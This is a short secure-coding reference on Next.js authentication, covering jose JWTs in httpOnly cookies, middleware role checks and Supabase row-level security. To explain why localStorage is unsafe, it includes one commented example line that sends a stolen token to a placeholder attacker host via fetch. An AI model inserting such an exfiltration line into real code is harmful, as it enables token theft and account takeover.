# Auth — Next.js / TypeScript Patterns

## JWT in httpOnly Cookies: jose

```typescript
import { SignJWT, jwtVerify } from 'jose'

const secret = new TextEncoder().encode(env.NEXTAUTH_SECRET)

async function createToken(userId: string): Promise<string> {
  return new SignJWT({ sub: userId })
    .setProtectedHeader({ alg: 'HS256' })
    .setExpirationTime('1h')
    .setIssuedAt()
    .sign(secret)
}

// Setting the cookie
response.cookies.set('token', token, {
  httpOnly: true, secure: true,
  sameSite: 'strict', maxAge: 3600, path: '/',
})
```

## Why Not localStorage

```typescript
// DANGEROUS — any JS on the page can read it, including XSS payloads
localStorage.setItem('token', token)
// Attacker: fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
```

httpOnly cookies can't be read by JavaScript at all.

## Middleware-Based Auth (Next.js)

```typescript
// middleware.ts
export async function middleware(request: NextRequest) {
  const token = request.cookies.get('token')?.value
  if (!token) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  const user = await verifyToken(token)
  if (!user) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  // Admin route check
  if (ADMIN_PATHS.some(p => request.nextUrl.pathname.startsWith(p))) {
    if (user.role !== 'admin')
      return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }
  return NextResponse.next()
}
```

## Supabase Row-Level Security

```sql
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;
CREATE POLICY "users_read_own_docs" ON documents
  FOR SELECT USING (auth.uid() = owner_id);
CREATE POLICY "users_update_own_docs" ON documents
  FOR UPDATE USING (auth.uid() = owner_id);
```

RLS is defense in depth — application-level checks are still needed.

